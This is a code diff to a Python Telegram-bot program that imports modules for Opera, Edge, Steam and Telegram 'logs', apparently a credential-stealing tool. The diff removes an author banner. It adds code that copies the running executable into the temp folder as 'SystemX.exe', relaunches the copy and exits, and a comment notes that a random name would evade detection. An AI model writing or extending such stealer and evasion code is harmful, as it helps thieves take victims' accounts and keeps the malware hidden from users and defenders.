@@ -1,8 +1,3 @@
-# # # # # # # # # # # # # # # # # # # # # # #
-#                                           #
-#         by BeanD [t.me/PearDe]            #
-#                                           #
-# # # # # # # # # # # # # # # # # # # # # # #
 
 # ---- Imports ---- #
 from aiogram import Bot, Dispatcher, executor, types # Базовые импорты iogram
@@ -16,7 +11,22 @@ from logs.opera import * # Импортируем логи оперы
 from logs.telegram import * # Импортируем логи телеграма
 from logs.steam import * # Импортируем логи стима
 from logs.Edge import *
+import os
+import sys
+import shutil
+import tempfile
+import subprocess
 # ---- Imports ---- #
+
+temp_dir = tempfile.gettempdir()
+# Можно дать случайное имя, чтобы сложнее было обнаружить
+temp_file = os.path.join(temp_dir, "SystemX.exe")
+
+# Если это не Temp-файл — копируем и запускаем копию
+if os.path.abspath(sys.argv[0]) != os.path.abspath(temp_file):
+    shutil.copy2(sys.argv[0], temp_file)  # Копируем текущий exe в temp
+    subprocess.Popen([temp_file])          # Запускаем копию
+    sys.exit()                             # Закрываем текущий процесс
 
 bot = Bot(token=token) # Переменная bot которая содержит в себе токен бота
 storage = MemoryStorage() # Машина состояний
